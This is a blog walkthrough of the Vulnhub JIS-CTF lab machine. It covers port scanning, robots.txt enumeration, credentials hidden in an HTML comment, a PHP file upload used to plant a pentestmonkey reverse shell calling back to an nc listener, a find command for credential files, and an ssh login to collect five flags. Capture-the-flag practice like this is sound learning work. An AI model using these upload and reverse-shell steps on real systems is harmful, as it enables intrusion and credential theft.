---
layout:     post
title:      "Vulnhub.com - JIS-CTF"
date:       2018-06-27 0:00:00
author:     "W3ndige"
permalink: /:title/
category: Vulnhub
---

Today we're going to work on a challenge from Vulnhub called ***JIS-CTF***.

{% highlight text %}
VM Name: JIS-CTF : VulnUpload

Difficulty: Beginner

Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags.
{% endhighlight %}

* Author: [Mohammad Khreesha](https://twitter.com/@banyrock)
* Download: [https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/](https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/)

### Solution

Firstly, we're going to scan the whole network with `nmap` in order to find the IP address of the machine. 

{% highlight bash %}
root@kali:~# nmap 10.0.0.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-27 03:38 EDT
Nmap scan report for 10.0.0.3
Host is up (0.000084s latency).
All 1000 scanned ports on 10.0.0.3 are filtered
MAC Address: 08:00:27:EB:97:9B (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.0.5
Host is up (0.00020s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:68:18:58 (Oracle VirtualBox virtual NIC)

Nmap scan report for 10.0.0.4
Host is up (0.0000080s latency).
All 1000 scanned ports on 10.0.0.4 are closed

Nmap done: 256 IP addresses (5 hosts up) scanned in 5.90 seconds
{% endhighlight %}

Great, from the beginning we can see that both `ssh` and `http` services are up and running. In order to make the best performance I'm going to run more comprehensive scan in the background while checking services manually. 

Firstly, the `ssh` service does not appear to be anything different than any 'normal' ssh services. 

{% highlight bash %}
root@kali:~# ssh root@10.0.0.5
The authenticity of host '10.0.0.5 (10.0.0.5)' can't be established.
ECDSA key fingerprint is SHA256:ThPvIGqyDX2PSqt5JWHyy/J/Hy2hK5aVcpKTpkTKHQE.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.0.0.5' (ECDSA) to the list of known hosts.
root@10.0.0.5's password: 
Permission denied, please try again.
{% endhighlight %}

In the meantime the other `nmap` scan has finished, so we can take a look at it. 

What parameters I'm using?

* *-p-* - scan all 65535 ports
* *-v* - verbose output
* *-sS* - TCP-SYN scan
* *-A* - OS detection, version detection and traceroute
* *-T4* - aggresive scan

{% highlight bash %}
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-27 03:45 EDT
NSE: Loaded 148 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:45
Completed NSE at 03:45, 0.00s elapsed
Initiating NSE at 03:45
Completed NSE at 03:45, 0.00s elapsed
Initiating ARP Ping Scan at 03:45
Scanning 10.0.0.5 [1 port]
Completed ARP Ping Scan at 03:45, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:45
Completed Parallel DNS resolution of 1 host. at 03:45, 0.01s elapsed
Initiating SYN Stealth Scan at 03:45
Scanning 10.0.0.5 [65535 ports]
Discovered open port 22/tcp on 10.0.0.5
Discovered open port 80/tcp on 10.0.0.5
Completed SYN Stealth Scan at 03:45, 4.07s elapsed (65535 total ports)
Initiating Service scan at 03:45
Scanning 2 services on 10.0.0.5
Completed Service scan at 03:45, 6.25s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.0.0.5
NSE: Script scanning 10.0.0.5.
Initiating NSE at 03:45
Completed NSE at 03:45, 1.45s elapsed
Initiating NSE at 03:45
Completed NSE at 03:45, 0.00s elapsed
Nmap scan report for 10.0.0.5
Host is up (0.00048s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 af:b9:68:38:77:7c:40:f6:bf:98:09:ff:d9:5f:73:ec (RSA)
|   256 b9:df:60:1e:6d:6f:d7:f6:24:fd:ae:f8:e3:cf:16:ac (ECDSA)
|_  256 78:5a:95:bb:d5:bf:ad:cf:b2:f5:0f:c0:0c:af:f7:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 8 disallowed entries 
| / /backup /admin /admin_area /r00t /uploads 
|_/uploaded_files /flag
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Sign-Up/Login Form
|_Requested resource was login.php
MAC Address: 08:00:27:68:18:58 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Uptime guess: 0.003 days (since Wed Jun 27 03:41:59 2018)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 10.0.0.5

NSE: Script Post-scanning.
Initiating NSE at 03:45
Completed NSE at 03:45, 0.00s elapsed
Initiating NSE at 03:45
Completed NSE at 03:45, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.32 seconds
           Raw packets sent: 65558 (2.885MB) | Rcvd: 65550 (2.623MB)
{% endhighlight %}

From this we can already see the directory structure behind the `http` service.

{% highlight text %}
| http-robots.txt: 8 disallowed entries 
| / /backup /admin /admin_area /r00t /uploads 
|_/uploaded_files /flag
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-title: Sign-Up/Login Form
{% endhighlight %}

Let's head for the flag at first in `/flag` directory.

{% highlight text %}
The 1st flag is : {8734509128730458630012095}
{% endhighlight %}

Now we're iterating over the directories in `robots.txt`. In `admin_area` we can find the second flag. 

{% highlight html %}
<html>
<head>
<title>
Fake admin area :)
</title>
<body>
<center><h1>The admin area not work :) </h1></center>
<!--	username : admin
	password : 3v1l_H@ck3r
	The 2nd flag is : {7412574125871236547895214}
-->
</body>
</html>
{% endhighlight %}

Now as we have the credentials to login into the main `login.php`, I decided to already check other directories. You simply can't leave stuff untouched as there may be some clues. 

Only `/uploaded_files/` are present but for now, it's a blank file. Coming back to `login.php`, we're ready to log into the account. 

{% highlight html %}
<form action="check_login.php" method="post">
    <div class="field-wrap">
        <label>
        Username<span class="req">*</span>
        </label>
        <input name="user_name" type="text"required autocomplete="off"/>
    </div>
     <div class="field-wrap">
        <label>
            Password<span class="req">*</span>
        </label>
        <input name="pass_word" type="password"required autocomplete="off"/>
    </div> 
    <button class="button button-block"/>Log In</button>
</form>
{% endhighlight %}

After redirection, we are presented with possibility to upload files. 

{% highlight html %}
<header>
    <h1>File Upload Center</h1>
</header>
		
<div id="dropbox">
    <br />
    <br />
    <center>
        <form action="" method="POST" enctype="multipart/form-data">
            <input type="file" name="image" />
            <input type="submit" value="Upload File"/>
        </form>
    </center>
</div>
{% endhighlight %}

At first, I decide to create a file that will check whether or not `php` code will execute. 

{% highlight bash %}
root@kali:~/vulnhub/jis-ctf# vi test.php
root@kali:~/vulnhub/jis-ctf# cat test.php 
<?php
echo("Will it work?");
?>
{% endhighlight %}

We can see a simple `Success` message but in `/uploaded_files` directory there's no change from the last state, still blank file. That's when I noticed that we have to append the name of the file to the directory just like this `uploaded_files/test.php`. 

And to surprise, `php` code is executed.

{% highlight text %}
Will it work?
{% endhighlight %}

Now my goal is to get and upload `php reverse shell` from [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell). 

As always, we have to change the IP address in this file in order to work. 

{% highlight bash %}
root@kali:~/vulnhub/jis-ctf# touch reverse-shell.php
root@kali:~/vulnhub/jis-ctf# vi reverse-shell.php 
root@kali:~/vulnhub/jis-ctf# cat reverse-shell.php 
$ip = '10.0.0.4';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
{% endhighlight %}

At that moment we are ready to run the listener with `nc` that will listen for connection from reverse shell. 

What does the parameters mean? 

* *-l* - listen
* *-v* - verbose output
* *-n* - don't do DNS lookups
* *-p 1234* - specify port 1234

{% highlight bash %}
root@kali:~# nc -lvnp 1234
listening on [any] 1234 ...
{% endhighlight %}

Now in the same way that worked with the previous file, we're going to upload the reverse shell and go to that file with `/uploaded_files/reverse_shell.php`. In the meantime, `nc` should be able to 'catch' the connection. 

{% highlight bash %}
root@kali:~# nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.0.0.4] from (UNKNOWN) [10.0.0.5] 55562
Linux Jordaninfosec-CTF01 4.4.0-128-generic #154-Ubuntu SMP Fri May 25 14:15:18 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 11:38:26 up 33 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
{% endhighlight %}

Now we're ready to fully explore the system. Firstly, I'm going to check home directory for present users. 

{% highlight bash %}
$ cd /home
$ ls -la
total 12
drwxr-xr-x  3 root     root     4096 Apr 11  2017 .
drwxr-xr-x 23 root     root     4096 Jun 27 10:46 ..
drwxr-xr-x  3 technawi technawi 4096 Apr 21  2017 technawi
$ cd technawi
$ ls -la
total 48
drwxr-xr-x 3 technawi technawi 4096 Apr 21  2017 .
drwxr-xr-x 3 root     root     4096 Apr 11  2017 ..
-rw------- 1 technawi technawi 4321 Apr 21  2017 .bash_history
-rw-r--r-- 1 technawi technawi  220 Apr 11  2017 .bash_logout
-rw-r--r-- 1 technawi technawi 3771 Apr 11  2017 .bashrc
drwx------ 2 technawi technawi 4096 Apr 11  2017 .cache
-rw-r--r-- 1 technawi technawi  655 Apr 11  2017 .profile
-rw-r--r-- 1 technawi technawi    0 Apr 11  2017 .sudo_as_admin_successful
-rw------- 1 root     root     6666 Apr 21  2017 .viminfo
-rw-r--r-- 1 root     root     7141 Apr 18  2017 1
{% endhighlight %}

But as nothing was there I decided to look at content of `/var/www/html` directory. 

{% highlight bash %}
$ cd /var/www
$ ls -la
total 12
drwxr-xr-x  3 www-data www-data 4096 Apr 18  2017 .
drwxr-xr-x 14 root     root     4096 Apr 18  2017 ..
drwxr-xr-x  8 www-data www-data 4096 Apr 21  2017 html
$ cd html
$ ls -la
total 60
drwxr-xr-x 8 www-data www-data 4096 Apr 21  2017 .
drwxr-xr-x 3 www-data www-data 4096 Apr 18  2017 ..
drwxrwxr-x 2 www-data www-data 4096 Apr 21  2017 admin_area
drwx------ 5 www-data www-data 4096 Apr 19  2017 assets
-rw-r--r-- 1 www-data www-data  306 Apr 19  2017 check_login.php
drwx------ 2 www-data www-data 4096 Apr 19  2017 css
drwxr-xr-x 2 www-data www-data 4096 Apr 21  2017 flag
-rw-r----- 1 technawi technawi  132 Apr 21  2017 flag.txt
-rw-r--r-- 1 www-data www-data  145 Apr 21  2017 hint.txt
-rw-rw-r-- 1 www-data www-data 1966 Apr 19  2017 index.php
drwx------ 2 www-data www-data 4096 Apr 19  2017 js
-rw-rw-r-- 1 www-data www-data 1485 Apr 19  2017 login.php
-rw-r--r-- 1 www-data www-data  128 Apr 19  2017 logout.php
-rw-rw-r-- 1 www-data www-data  160 Apr 19  2017 robots.txt
drwxrwxr-x 2 www-data www-data 4096 Jun 27 11:38 uploaded_files
$ cat hint.txt	
try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;)

The 3rd flag is : {7645110034526579012345670}
{% endhighlight %}

Two more flags to go! As stated in the hint, we can't access the `flag.txt` file. 

{% highlight bash %}
$ cat flag.txt
cat: flag.txt: Permission denied
{% endhighlight %}

After a trial and error marathon, I've found the hidden file with this simple `find` command listing all files owned by `technawi`. 

{% highlight bash %}
$ find / -user technawi 2>/dev/null
/etc/mysql/conf.d/credentials.txt
/var/www/html/flag.txt
/home/technawi
/home/technawi/.cache
/home/technawi/.bash_history
/home/technawi/.sudo_as_admin_successful
/home/technawi/.profile
/home/technawi/.bashrc
/home/technawi/.bash_logout
{% endhighlight %}

Now we can take a look at the credentials. 

{% highlight bash %}
$ cat /etc/mysql/conf.d/credentials.txt
The 4th flag is : {7845658974123568974185412}

username : technawi
password : 3vilH@ksor
{% endhighlight %}

Now let's login with `ssh` into that account and retrieve the final flag. 

{% highlight bash %}
root@kali:~/vulnhub/jis-ctf# ssh technawi@10.0.0.5
technawi@10.0.0.5's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

114 packages can be updated.
1 update is a security update.


Last login: Fri Apr 21 17:22:16 2017
technawi@Jordaninfosec-CTF01:~$ cd /var/www/html
technawi@Jordaninfosec-CTF01:/var/www/html$ ls -la
total 60
drwxr-xr-x 8 www-data www-data 4096 Apr 21  2017 .
drwxr-xr-x 3 www-data www-data 4096 Apr 18  2017 ..
drwxrwxr-x 2 www-data www-data 4096 Apr 21  2017 admin_area
drwx------ 5 www-data www-data 4096 Apr 19  2017 assets
-rw-r--r-- 1 www-data www-data  306 Apr 19  2017 check_login.php
drwx------ 2 www-data www-data 4096 Apr 19  2017 css
drwxr-xr-x 2 www-data www-data 4096 Apr 21  2017 flag
-rw-r----- 1 technawi technawi  132 Apr 21  2017 flag.txt
-rw-r--r-- 1 www-data www-data  145 Apr 21  2017 hint.txt
-rw-rw-r-- 1 www-data www-data 1966 Apr 19  2017 index.php
drwx------ 2 www-data www-data 4096 Apr 19  2017 js
-rw-rw-r-- 1 www-data www-data 1485 Apr 19  2017 login.php
-rw-r--r-- 1 www-data www-data  128 Apr 19  2017 logout.php
-rw-rw-r-- 1 www-data www-data  160 Apr 19  2017 robots.txt
drwxrwxr-x 2 www-data www-data 4096 Jun 27 11:38 uploaded_files
technawi@Jordaninfosec-CTF01:/var/www/html$ cat flag.txt
The 5th flag is : {5473215946785213456975249}

Good job :)

You find 5 flags and got their points and finish the first scenario....
{% endhighlight%}